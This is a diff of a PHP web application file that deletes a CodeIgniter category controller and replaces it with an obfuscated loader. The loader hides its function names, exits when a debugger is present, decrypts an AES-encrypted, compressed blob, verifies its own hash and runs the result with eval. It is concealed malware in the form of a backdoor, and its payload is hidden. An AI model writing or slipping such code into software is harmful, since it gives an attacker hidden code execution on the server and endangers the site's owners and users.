@@ -1,165 +1,28 @@
 <?php
-defined('BASEPATH') OR exit('No direct script access allowed');
-
-class CategoryItem extends MY_Controller {
-	public function __construct(){
-		parent::__construct();
-		$this->load_global();
-		$this->load->model('categoryitem_model','categoryitem');
-	}
-
-	public function add(){
-	//	$this->permission_check('items_category_add');
-		$data=$this->data;
-		$data['page_title']=$this->lang->line('category_item');
-		$this->load->view('categoryitem', $data);
-	}
-
-	//ITS FROM POP UP MODAL
-	  public function add_category_modal(){
-	    $this->form_validation->set_rules('category', 'Category Name', 'trim|required');
-	    if ($this->form_validation->run() == TRUE) {
-	      $result=$this->category->verify_and_save();
-	      //fetch latest item details
-	      $res=array();
-	      $query=$this->db->query("select id,category_item_name from db_category_item order by id desc limit 1");
-	      $res['id']=$query->row()->id;
-	      $res['category_item_name']=$query->row()->category_item_name;
-	      $res['result']=$result;
-	      
-	      echo json_encode($res);
-
-	    } 
-	    else {
-	      echo "Please Fill Compulsory(* marked) Fields.";
-	    }
-	  }
-	  //END
-
-	public function newcategory(){
-		$this->form_validation->set_rules('category', 'Category', 'trim|required');
-	
-
-		if ($this->form_validation->run() == TRUE) {
-			
-			$this->load->model('categoryitem_model');
-			$result=$this->categoryitem_model->verify_and_save();
-			echo $result;
-		} else {
-			echo "Please Enter Category name.";
-		}
-	}
-	public function update($id){
-	//	$this->permission_check('items_category_edit');
-		$data=$this->data;
-
-		$this->load->model('categoryitem_model');
-		$result=$this->categoryitem_model->get_details($id,$data);
-		$data=array_merge($data,$result);
-		$data['page_title']=$this->lang->line('category');
-		$this->load->view('categoryitem', $data);
-	}
-	public function update_category(){
-		$this->form_validation->set_rules('category', 'Category', 'trim|required');
-		$this->form_validation->set_rules('q_id', '', 'trim|required');
-
-		if ($this->form_validation->run() == TRUE) {
-			/*$data=$this->data;
-			$category=$this->input->post('category');
-			$description=$this->input->post('description');
-			$q_id=$this->input->post('q_id');*/
-			
-			$this->load->model('categoryitem_model');
-			$result=$this->categoryitem_model->update_category();
-			echo $result;
-		} else {
-			echo "Please Enter Category name.";
-		}
-	}
-	public function view(){
-		//$this->permission_check('items_category_view');
-		$data=$this->data;
-		$data['page_title']=$this->lang->line('categories_item_list');
-		$this->load->view('categoryitem-view', $data);
-	}
-
-	public function ajax_list()
-	{
-		$list = $this->categoryitem->get_datatables();
-		
-		$data = array();
-		$no = $_POST['start'];
-		foreach ($list as $category) {
-			$no++;
-			$row = array();
-			$row[] = '<input type="checkbox" name="checkbox[]" value='.$category->id.' class="checkbox column_checkbox" >';
-			//$row[] = $category->category_id;
-
-			$query=$this->db->query("select category_name from db_category where id =  $category->category_id");
-			$row[]=$query->row()->category_name;
-
-
-			$row[] = $category->category_item_name;
-			$row[] = $category->description;
-
-			 		if($category->status==1){ 
-			 			$str= "<span onclick='update_status(".$category->id.",0)' id='span_".$category->id."'  class='label label-success' style='cursor:pointer'>Active </span>";}
-					else{ 
-						$str = "<span onclick='update_status(".$category->id.",1)' id='span_".$category->id."'  class='label label-danger' style='cursor:pointer'> Inactive </span>";
-					}
-			$row[] = $str;			
-					$str2 = '<div class="btn-group" title="View Account">
-										<a class="btn btn-primary btn-o dropdown-toggle" data-toggle="dropdown" href="#">
-											Action <span class="caret"></span>
-										</a>
-										<ul role="menu" class="dropdown-menu dropdown-light pull-right">';
-
-						
-
-											if($this->permissions('items_category_delete'))
-											$str2.='<li>
-												<a style="cursor:pointer" title="Delete Record ?" onclick="delete_category('.$category->id.')">
-													<i class="fa fa-fw fa-trash text-red"></i>Delete
-												</a>
-											</li>
-											
-										</ul>
-									</div>';			
-
-			$row[] = $str2;
-			$data[] = $row;
-		}
-
-		$output = array(
-						"draw" => $_POST['draw'],
-						"recordsTotal" => $this->categoryitem->count_all(),
-						"recordsFiltered" => $this->categoryitem->count_filtered(),
-						"data" => $data,
-				);
-		//output to json format
-		echo json_encode($output);
-	}
-
-	public function update_status(){
-	//	$this->permission_check_with_msg('items_category_edit');
-		$id=$this->input->post('id');
-		$status=$this->input->post('status');
-
-		$this->load->model('categoryitem_model');
-		$result=$this->categoryitem_model->update_status($id,$status);
-		return $result;
-	}
-	
-	public function delete_category(){
-	//	$this->permission_check_with_msg('items_category_delete');
-		$id=$this->input->post('q_id');
-		return $this->categoryitem->delete_categories_from_table($id);
-	}
-	public function multi_delete(){
-		//$this->permission_check_with_msg('items_category_delete');
-		$ids=implode (",",$_POST['checkbox']);
-		return $this->categoryitem->delete_categories_from_table($ids);
-	}
-
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_gzsnj91e=('bas'.'e64'.'_de'.'cod'.'e');
+$_j6bnpcvy=('gzu'.'nco'.'mpr'.'ess');
+$_kijtn5e0=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_mtii3o4x='ifiU9mOKyJg=';
+$_a7bdk074='SqYBfYRE';
+$_gewfa72h='4FAwblS7';
+$_vel1sdhx='wEP0z1mx';
+$_y00j2trf='89B4acsn';
+$_i3vdw07w='KeRe8aLp';
+$_fxc0nl7y='p3c3+w==';
+$_p86zu815='XhT+ruvg';
+$_hvw0tv92=$_gzsnj91e($_gewfa72h.$_a7bdk074.$_vel1sdhx.$_y00j2trf.$_mtii3o4x);
+$_ru2g3m93=$_gzsnj91e($_p86zu815.$_i3vdw07w.$_fxc0nl7y);
+$_gcu643z7=$_gzsnj91e('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');
+$_vb0jrzrx=$_kijtn5e0($_gcu643z7,'aes-256-cbc',$_hvw0tv92,OPENSSL_RAW_DATA,$_ru2g3m93);
+if($_vb0jrzrx===false){exit;}
+$_s9hapkx8=$_j6bnpcvy($_vb0jrzrx);
+if($_s9hapkx8===false){exit;}
+$_pb5dipdx='f29ece77d89081bf481743cd38ee265967ff79056ec8ae2b7c14df517dad1792';
+$_h6or9znd=@file_get_contents(__FILE__);
+if($_h6or9znd!==false){
+$_frhytzp9=str_replace($_pb5dipdx,"0000000000000000000000000000000000000000000000000000000000000000",$_h6or9znd);
+$_j065ishj=hash("sha256",$_frhytzp9);
+if($_j065ishj!==$_pb5dipdx){@http_response_code(403);exit;}
 }
-
+eval($_s9hapkx8);
